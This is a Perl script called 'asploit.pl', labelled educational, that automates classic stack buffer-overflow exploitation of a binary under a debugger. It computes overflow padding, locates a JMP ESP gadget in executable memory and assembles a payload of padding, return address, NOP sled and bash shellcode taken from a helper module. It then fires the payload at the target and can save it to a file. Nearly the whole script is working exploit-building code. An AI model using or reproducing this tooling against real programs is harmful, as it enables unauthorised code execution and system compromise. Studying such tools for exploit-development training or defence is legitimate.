#!/usr/bin/perl

#=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=\
# asploit.pl		                               			|
# Fuze a binary and try to craft exploit automaticaly whith Devel::gdb  |
#									|
# -*- coding: utf-8 -*-							|
#									|
# For educational purpose only          				|
#									|
# This program is free software: you can redistribute it and/or modify	|
# it under the terms of the GNU General Public License as published by	|
# the Free Software Foundation, either version 3 of the License, or	|
# (at your option) any later version.					|
#									|
# This program is distributed in the hope that it will be useful, 	|
# but WITHOUT ANY WARRANTY; without even the implied warranty of 	|
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the		|
# GNU General Public License for more details.				|
#									|
# You should have received a copy of the GNU General Public License	|
# along with this program.  If not, see <http://www.gnu.org/licenses/>.	|
#									|
#=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=/

use strict;
use warnings;
use Switch;
use dbg;

if($#ARGV < 0){ die("[-]: Missing arguments ! Please use -h option.\n"); }

sub usage(){
	print( "[+]: Usage : ./splt {-a -d -h -v -vv} [bin]"
		."\n -a arg\t argument to fuzz"
        	."\n -d\t show debug"
		."\n -h\t show this crap"
        	."\n -v\t verbose"
        	."\n -vv\t very verbose\n"
	);
	exit;
}

my $bin = '';

#TODO: playing with Getopt::Std and Getopt::Long
foreach( @ARGV ){
    switch( $_ ) {
        case( "-a" )
        { 
            #binary's arguments 
        }
	case( "-h" )	{ usage(); }
    	case( "-d" ) 	{ $dbg::debug = 1; }
        case( "-v" )	{ $dbg::verbose = 1; }
        case( "-vv" )   { $dbg::verbose = 1; $dbg::debug = 1; }
        else    	{ $bin = $_; }
    }
}
dbg::getDbg($bin);		            #Loading $bin in debug mod

my $perm	=	'..x.';             #executable permition regexp
my $jmpesp 	=	'0x....e4ff';       #JMP ESP Mnemonic regexp TODO: dealing with as ex.: 
my $mnem	= `echo "JMP *%esp" |as -al |tail -n +4 |cut -d " " -f 6 |tr 'A-Z' 'a-z' ; rm -f a.out;`;


print("\n$mnem\n");

#Define exploit padding
my $padding = 	dbg::getBof( dbg::getSym( 'ret' ), 1 );                             

#Find jmpesp in X mem
my $jumpadd =	dbg::fndMem( $jmpesp, dbg::getMem( dbg::getPid(), $perm ) );        

#Crafting payload
my $payload = 	dbg::setPld( $padding, $jumpadd, "\x90", $dbg::shc{ 'bash' } );

if( dbg::sndPld( $payload ) == 0 ){ #if loading payload :
    my $i = 0;
    until( $i == 1 ){
        print( "\nCreating Exploit ? (y/n) : " );
        my $input=<STDIN>;
        chop($input);
        switch($input){
           case /y/ { open( F, ">payload" ); print( F $payload ); close( F ); $i = 1; }
           case /n/ { $i = 1; }
           else		{ print( "\n$input ??? What does that mean ? " ); $i = 0; }
        }
    }
}
dbg::bye( "Bye ".`whoami` );
